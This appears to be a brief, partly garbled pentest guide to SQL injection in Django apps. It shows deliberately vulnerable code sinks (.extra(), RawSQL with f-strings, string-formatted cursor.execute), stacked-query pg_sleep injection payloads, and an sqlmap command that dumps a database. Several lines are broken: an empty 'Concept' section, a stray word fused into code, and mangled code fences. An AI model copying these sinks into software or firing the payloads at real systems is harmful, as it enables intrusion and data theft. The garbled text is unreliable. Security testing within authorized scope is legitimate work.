# Django SQL Injection

## When to Use
- When auditing or penetration testing a web application built on the Django framework (often identifiable by specific session cookies, admin panels, or error pages).
- To exploit areas where developers have strayed from the safe, built-in ORM features and opted for raw SQL execution or complex, unsafe query annotations.


## Prerequisites
- Authorized scope and target URLs from bug bounty program
- Burp Suite Professional (or Community) configured with browser proxy
- Familiarity with OWASP Top 10 and common web vulnerability classes
- SecLists wordlists for fuzzing and enumeration

## Workflow

### Phase 1: Understanding Django ORM Limitations

```text
# Concept: ```

### Phase 2: Identifying Sinks (Code Review / Black Box)

```python
# Sink 1: The `.extra()` method VULNERABLE tastefully order_by = request.GET.get('order_by')
users = User.objects.extra(order_by=[order_by])

# Sink 2: RawSQL VULNERABLE from django.db.models.expressions import RawSQL
search = request.GET.get('search')
products = Product.objects.annotate(val=RawSQL(f"select count(*) from app_product where name = '{search}'", []))

# Sink 3: from django.db import connection
def custom_query(request):
    user_input = request.GET.get('username')
    with connection.cursor() as cursor:
        cursor.execute("SELECT * FROM users WHERE username = '%s'" % user_input) # VULNERABLE ```

### Phase 3: Exploitation

```http
# GET /products?order_by=-id%3B%20SELECT%20pg_sleep(10)-- HTTP/1.1
Host: django-app.local

# GET /search?search=' OR 1=1; SELECT pg_sleep(5);-- HTTP/1.1
```

### Phase 4: Data Exfiltration (Time-Based)

```bash
# sqlmap -u "http://target.com/products?order_by=id" -p order_by --technique=T --dbms=postgresql --dump
```
